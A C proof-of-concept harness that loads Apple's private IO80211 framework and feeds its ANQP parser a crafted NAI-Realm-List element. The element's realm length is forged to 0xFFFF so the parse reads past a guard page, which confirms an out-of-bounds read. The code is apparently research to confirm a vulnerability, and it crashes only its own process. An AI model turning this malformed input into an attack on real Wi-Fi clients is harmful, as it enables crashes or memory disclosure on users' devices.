// ANQP NAI-Realm-List OOB read confirm — stock IO80211.framework, guard-page harness.
// Self-contained: crashes only this process. Confirms the u16 realm-length -> CFStringCreateWithBytes
// over-read past the buffer end by placing realm-data at a guard-page boundary.
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <dlfcn.h>
#include <signal.h>
#include <unistd.h>
#include <sys/mman.h>
#include <CoreFoundation/CoreFoundation.h>

static void *g_guard = 0;
static void handler(int sig, siginfo_t *si, void *uc){
  const char *s = (sig==SIGSEGV)?"SIGSEGV":"SIGBUS";
  char buf[256];
  int n = snprintf(buf,sizeof buf,
    "\n[CONFIRMED] %s at fault addr %p ; guard page = %p ; delta=%ld\n"
    "OOB read reached the guard page -> ANQP NAI-Realm-List over-read fired on stock.\n",
    s, si->si_addr, g_guard, (long)((char*)si->si_addr-(char*)g_guard));
  write(2, buf, n);
  _exit(42);
}

typedef int (*anqp_fn)(const void *buf, uint32_t len, CFMutableDictionaryRef dict);

int main(void){
  void *h = dlopen("/System/Library/PrivateFrameworks/IO80211.framework/IO80211", RTLD_NOW);
  if(!h){ fprintf(stderr,"dlopen fail: %s\n", dlerror()); return 1; }
  anqp_fn fn = (anqp_fn)dlsym(h, "OSX_Apple80211ANQPParseANQPData");
  if(!fn){ fprintf(stderr,"dlsym fail\n"); return 1; }
  fprintf(stderr,"parser @ %p\n",(void*)fn);

  long ps = sysconf(_SC_PAGESIZE);
  char *region = mmap(NULL, ps*2, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE, -1, 0);
  if(region==MAP_FAILED){ perror("mmap"); return 1; }
  char *guard = region + ps;
  if(mprotect(guard, ps, PROT_NONE)!=0){ perror("mprotect"); return 1; }
  g_guard = guard;

  // Buffer laid out so realm-data (buf+7) sits a few bytes before the guard page.
  // buf[0..1]=elemID 0x0104 ; buf[2..3]=EL (nonzero) ; buf[4]=realm entry byte0 ;
  // buf[5..6]=realm-data-field-length=0xFFFF ; buf[7..]=realm data (reads 0xFFFF here).
  const int VALID = 4;              // valid data bytes before the guard boundary
  const int HDRLEN = 7;             // bytes before realm-data
  char *buf = guard - (HDRLEN + VALID);
  buf[0]=0x04; buf[1]=0x01;         // element id 0x0104 (NAI Realm List)
  buf[2]=0x08; buf[3]=0x00;         // EL = 8 (nonzero; entry requires len>=EL)
  buf[4]=0x00;                      // realm entry byte0 (skipped)
  buf[5]=0xFF; buf[6]=0xFF;         // realm-data-field-length = 0xFFFF (attacker u16)
  memset(buf+7, 'A', VALID);        // valid UTF-8 up to the boundary, then guard page

  CFMutableDictionaryRef dict = CFDictionaryCreateMutable(NULL,0,&kCFTypeDictionaryKeyCallBacks,&kCFTypeDictionaryValueCallBacks);

  struct sigaction sa; memset(&sa,0,sizeof sa);
  sa.sa_sigaction=handler; sa.sa_flags=SA_SIGINFO; sigemptyset(&sa.sa_mask);
  sigaction(SIGSEGV,&sa,0); sigaction(SIGBUS,&sa,0);

  uint32_t len = HDRLEN + VALID;    // >=4 and >=EL(8)
  fprintf(stderr,"calling parser: buf=%p guard=%p realm-data=%p len=%u (realm-len=0xFFFF)\n",
          (void*)buf,(void*)guard,(void*)(buf+7),len);
  int r = fn(buf, len, dict);
  // If we get here, the over-read did NOT cross the guard page (bug not triggered as modeled).
  fprintf(stderr,"[NO-FAULT] parser returned %d without crossing guard page — layout needs adjust\n", r);
  return 0;
}
